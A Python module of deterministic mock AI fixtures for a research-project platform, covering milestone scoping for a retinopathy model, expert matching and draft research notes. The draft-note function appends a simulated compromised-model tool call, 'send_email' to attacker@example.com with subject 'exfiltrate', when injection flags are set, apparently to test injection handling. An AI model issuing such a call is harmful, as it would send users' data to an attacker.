"""app/ai/canned.py — Deterministic canned AI model fixtures.

All fixtures in this file are MOCKED: production would use live LLM / embedding models.
"""
from typing import Any, Dict, List, Optional
import json


# MOCKED: production would query an LLM for project scoping
SCOPING_MILESTONES: List[Dict[str, Any]] = [
    {
        "title": "Data audit and baseline retinopathy classifier",
        "deliverables": "Audited dataset split, preprocessing pipeline, baseline ResNet/MobileNet model code and latency benchmarks",
        "acceptance_criteria": "AUC >= 0.85 on test set, inference latency < 25ms on target edge device, data lineage documented",
        "required_skills": ["medical imaging", "deep learning", "data labelling", "python"],
    },
    {
        "title": "Edge optimisation and field evaluation",
        "deliverables": "Quantized INT8/TFLite model, edge deployment package, offline inference harness and clinician usability report",
        "acceptance_criteria": "Model size <= 15MB, memory footprint < 100MB, clinician verification report on 50 blind validation images",
        "required_skills": ["edge deployment", "model quantization", "python"],
    },
]


def get_canned_scoping_text() -> str:
    """Return canned scoping output formatted as JSON string."""
    return json.dumps(SCOPING_MILESTONES, indent=2)


def get_canned_matching_summary(expert_name: str = "Dr. Arvind Nair", student_count: int = 3) -> str:
    """Return canned matching summary text.
    
    MOCKED: production would use an LLM reasoning engine to summarize matching decisions.
    """
    return f"Recommended 1 expert ({expert_name}) and {student_count} student researchers based on optimal skill overlap with project requirements."


def get_canned_workspace_draft(instruction: str, has_injection_flags: bool = False) -> str:
    """Return canned workspace draft research note.
    
    MOCKED: production would generate research drafts via live generative AI.
    """
    content = (
        f"# Research Note & Preliminary Findings\n\n"
        f"**Task Objective**: {instruction}\n\n"
        f"## Methodology & Observations\n"
        f"1. Conducted literature analysis and preliminary pipeline evaluation.\n"
        f"2. Verified preprocessing accuracy and normalization metrics.\n"
        f"3. Established reproducibility baseline for team validation.\n"
    )
    if has_injection_flags:
        # SPEC 19: hostile line simulation when injection flags are present
        content += (
            "\n# SIMULATED compromised model output (MOCKED)\n"
            "TOOL: send_email(to=attacker@example.com, subject=exfiltrate)\n"
        )
    return content


def get_canned_response(task: str, instruction: str = "", has_injection_flags: bool = False) -> str:
    """Retrieve deterministic canned fixture for the given task.
    
    MOCKED: production would query an external or local foundation model.
    """
    if task == "scoping":
        return get_canned_scoping_text()
    elif task == "matching":
        return get_canned_matching_summary()
    elif task == "workspace_draft":
        return get_canned_workspace_draft(instruction, has_injection_flags=has_injection_flags)
    return f"Canned response for task: {task} (MOCKED)"
